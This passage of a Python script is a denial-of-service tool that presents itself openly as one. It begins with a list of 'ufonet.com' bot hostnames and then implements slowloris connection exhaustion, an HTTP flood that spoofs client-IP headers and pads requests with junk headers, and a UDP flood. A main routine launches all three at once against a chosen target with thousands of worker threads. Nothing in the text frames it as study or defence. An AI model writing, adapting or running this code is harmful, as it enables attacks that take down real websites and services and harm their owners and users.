    'bot1381.ufonet.com', 'bot1382.ufonet.com', 'bot1383.ufonet.com', 'bot1384.ufonet.com', 'bot1385.ufonet.com',
    'bot1386.ufonet.com', 'bot1387.ufonet.com', 'bot1388.ufonet.com', 'bot1389.ufonet.com', 'bot1390.ufonet.com',
    'bot1391.ufonet.com', 'bot1392.ufonet.com', 'bot1393.ufonet.com', 'bot1394.ufonet.com', 'bot1395.ufonet.com',
    'bot1396.ufonet.com', 'bot1397.ufonet.com', 'bot1398.ufonet.com', 'bot1399.ufonet.com', 'bot1400.ufonet.com',
]

def rand_string(length=10):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    return session

def slowloris_attack(target_host, port):
    """Slowloris connection exhaustion"""
    global requests_sent, errors
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    try:
        sock.connect((target_host, port))
        sock.send(b"GET /?{} HTTP/1.1\r\n".format(rand_string()).encode())
        sock.send(b"Host: {}\r\n".format(target_host.encode()))
        
        while True:
            sock.send((f"X-A: {random.randint(1,5000)}\r\n").encode())
            time.sleep(0.1)
            with lock:
                requests_sent += 1
    except:
        with lock:
            errors += 1
        sock.close()

def massive_http_flood(session, target_url, method, rate, delay):
    """Layer 7 HTTP flood with randomization"""
    global requests_sent, bytes_sent, errors
    
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    path = parsed.path or '/'
    
    while True:
        try:
           
            query = f"?q={rand_string(15)}&t={random.randint(1,999999)}"
            url = f"{target_url.rstrip('/')}{path}{query}"
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': rand_ip(),
                'X-Real-IP': rand_ip(),
                'X-Originating-IP': rand_ip(),
                'X-Remote-IP': rand_ip(),
                'X-Cluster-Client-IP': rand_ip(),
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Flooder': f'Bot-{random.randint(1000,9999)}',
            }
            
        
            for i in range(20):
                headers[f'X-Junk-{rand_string(6)}'] = rand_string(25)
            
            if method == 'POST':
                data = {f'param{random.randint(1,10)}': rand_string(100)}
                resp = session.post(url, headers=headers, data=data, timeout=5)
            else:
                resp = session.get(url, headers=headers, timeout=5)
            
            with lock:
                requests_sent += 1
                bytes_sent += len(resp.content)
                
            if rate > 0:
                time.sleep(1.0 / rate)
            if delay > 0:
                time.sleep(delay)
                
        except:
            with lock:
                errors += 1

def udp_flood(target_host, port):
    """UDP amplification flood"""
    global requests_sent, bytes_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    payload = rand_string(1400).encode()
    
    while True:
        try:
            sock.sendto(payload, (target_host, port))
            with lock:
                requests_sent += 1
                bytes_sent += len(payload)
        except:
            pass

def print_stats():
    """Live stats display"""
    global requests_sent, bytes_sent, errors
    start_time = time.time()
    
    while True:
        time.sleep(2)
        elapsed = time.time() - start_time
        rps = requests_sent / elapsed if elapsed > 0 else 0
        mbps = (bytes_sent / (1024*1024)) / elapsed if elapsed > 0 else 0
        
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"{Fore.GREEN}📊 LIVE STATS")
        print(f"{Fore.CYAN}RPS: {rps:,.0f} | Total Requests: {requests_sent:,} | Errors: {errors:,}")
        print(f"{Fore.YELLOW}Bandwidth: {mbps:.2f} MB/s | Total: {bytes_sent/(1024*1024):.1f} MB")
        print(f"{Fore.WHITE}Workers Active: {threading.active_count()-1}")

def main():
    banner()
    args = parse_args()
    
    parsed_url = urllib.parse.urlparse(args.target)
    target_host = parsed_url.hostname
    target_port = args.port
    
    print(f"{Fore.GREEN}🚀 Launching MASSIVE DDoS on {args.target}:{target_port}")
    print(f"{Fore.YELLOW}Workers: {args.workers:,} | Method: {args.method} | Rate: {args.rate}rps | Delay: {args.delay}s")
    print(f"{Fore.WHITE}Press Ctrl+C to stop...\n")
    
   
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    time.sleep(2)
    
   
    sessions = [create_session() for _ in range(args.workers // 10)]
    
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        
        for i in range(args.workers):
            session = sessions[i % len(sessions)]
            executor.submit(massive_http_flood, session, args.target, args.method, args.rate, args.delay)
        
        
        for i in range(args.workers // 5):
            executor.submit(slowloris_attack, target_host, target_port)
        
        
        for i in range(args.workers // 10):
            executor.submit(udp_flood, target_host, target_port)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Attack terminated by user")
        print(f"{Fore.GREEN}📈 Final Stats: {requests_sent:,} requests, {bytes_sent/(1024*1024):.1f}MB sent")

if __name__ == "__main__":
    main()
